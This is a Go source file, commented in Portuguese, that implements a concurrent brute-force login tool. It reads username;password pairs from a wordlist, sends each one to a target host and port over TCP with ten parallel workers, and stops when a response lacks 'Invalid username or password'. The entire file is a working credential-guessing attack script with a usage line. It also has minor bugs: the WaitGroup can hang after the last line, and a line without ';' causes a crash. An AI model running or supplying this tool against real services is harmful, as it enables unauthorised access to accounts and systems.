package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var semaforo = make(chan struct{}, 10)


func estabelecer_conexao(endereco string, porta int, nome string, senha string, wg *sync.WaitGroup) {
	defer wg.Done()

	semaforo <- struct{}{}
	defer func() { <- semaforo}()
	alvo := fmt.Sprintf("%s:%d", endereco, porta)

	conn, err := net.DialTimeout("tcp", alvo, 5 * time.Second)
	if err != nil {
		return
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(5 * time.Second))

	buffer := make([]byte, 1024)

	//consumindo banner
	n, err := conn.Read(buffer)
	if err != nil { return }

	conn.Write([]byte(nome + "\n"))

	// consumindo o "Nome:"
	n, err = conn.Read(buffer)
	if err != nil { return }

	// consumindo o nome replicado
	n, err = conn.Read(buffer)
	if err != nil { return }


	conn.Write([]byte(senha + "\n"))
	// consumindo a senha replicada
	n, err = conn.Read(buffer)
	if err != nil { return }


	n, err = conn.Read(buffer)
	if err != nil { return }


	if !strings.Contains(string(buffer), "Invalid username or password") {
		fmt.Printf("[!!] Saiu alguma coisa diferente com %s/%s | Resposta: %s", nome, senha, string(buffer[:n]))
		os.Exit(0)
	}
}
func main() {
	args := os.Args

	if len(args) <  4 {
		fmt.Println("Usage: ./bruteforec <wordlist> <host> <port>")
		return
	}
	file, err := os.Open(args[1])
	if err != nil {
		log.Fatal(err)
	}

	porta, err:= strconv.Atoi(args[3])
	if err != nil {
		log.Fatal("Porta precisa ser inteiro: ", err)
	}
	r := bufio.NewReader(file)

	var wg sync.WaitGroup

	for {
		wg.Add(1)
		line, err := r.ReadString('\n')
		if err != nil {
			break
		}

		nome_senha := strings.Split(line, ";")

		nome := nome_senha[0]
		senha := nome_senha[1]
		go estabelecer_conexao(args[2], porta, nome, senha, &wg)
	}

	wg.Wait()
	fmt.Println("Acabou")

}
